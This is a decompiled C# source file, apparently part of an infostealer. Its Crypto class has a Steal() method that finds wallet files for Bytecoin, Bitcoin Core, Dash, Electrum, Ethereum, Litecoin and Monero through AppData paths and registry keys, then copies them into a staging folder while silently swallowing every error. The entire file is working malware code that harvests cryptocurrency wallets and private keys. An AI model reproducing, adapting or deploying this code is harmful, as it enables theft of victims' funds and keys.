using System;
using System.IO;
using Microsoft.Win32;

namespace NoFile
{
	// Token: 0x02000016 RID: 22
	internal class Crypto
	{
		// Token: 0x060000F8 RID: 248 RVA: 0x000066A4 File Offset: 0x000048A4
		public static void BCN(string dir)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin").GetFiles())
				{
					Directory.CreateDirectory(dir + "\\Bytecoin\\");
					if (fileInfo.Extension.Equals(".wallet"))
					{
						fileInfo.CopyTo(dir + "\\Bytecoin\\" + fileInfo.Name);
						Crypto.count++;
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x0000673C File Offset: 0x0000493C
		public static void BitcoinCore(string dir)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
				{
					try
					{
						Directory.CreateDirectory(dir + "\\BitcoinCore\\");
						File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", dir + "\\BitcoinCore\\wallet.dat");
						Crypto.count++;
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000FA RID: 250 RVA: 0x000067F4 File Offset: 0x000049F4
		public static void DSH(string dir)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
				{
					try
					{
						Directory.CreateDirectory(dir + "\\DashCore\\");
						File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", dir + "\\DashCore\\wallet.dat");
						Crypto.count++;
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000FB RID: 251 RVA: 0x000068AC File Offset: 0x00004AAC
		public static void Electrum(string dir)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets").GetFiles())
				{
					Directory.CreateDirectory(dir + "\\Electrum\\");
					fileInfo.CopyTo(dir + "\\Electrum\\" + fileInfo.Name);
					Crypto.count++;
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000FC RID: 252 RVA: 0x00006934 File Offset: 0x00004B34
		public static void ETH(string dir)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore").GetFiles())
				{
					Directory.CreateDirectory(dir + "\\Ethereum\\");
					fileInfo.CopyTo(dir + "\\Ethereum\\" + fileInfo.Name);
					Crypto.count++;
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000FD RID: 253 RVA: 0x000069BC File Offset: 0x00004BBC
		public static void LTC(string dir)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
				{
					try
					{
						Directory.CreateDirectory(dir + "\\LitecoinCore\\");
						File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", dir + "\\LitecoinCore\\wallet.dat");
						Crypto.count++;
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000FE RID: 254 RVA: 0x00006A74 File Offset: 0x00004C74
		public static int Steal(string cryptoDir)
		{
			Crypto.BCN(cryptoDir);
			Crypto.BitcoinCore(cryptoDir);
			Crypto.DSH(cryptoDir);
			Crypto.Electrum(cryptoDir);
			Crypto.ETH(cryptoDir);
			Crypto.LTC(cryptoDir);
			Crypto.XMR(cryptoDir);
			return Crypto.count;
		}

		// Token: 0x060000FF RID: 255 RVA: 0x00006AA8 File Offset: 0x00004CA8
		public static void XMR(string dir)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
				{
					try
					{
						Directory.CreateDirectory(dir + "\\Monero\\");
						string text = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
						Directory.CreateDirectory(dir + "\\Monero\\");
						char[] separator = new char[]
						{
							'\\'
						};
						char[] separator2 = new char[]
						{
							'\\'
						};
						File.Copy(text, dir + "\\Monero\\" + text.Split(separator)[text.Split(separator2).Length - 1]);
						Crypto.count++;
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x04000046 RID: 70
		public static int count;
	}
}
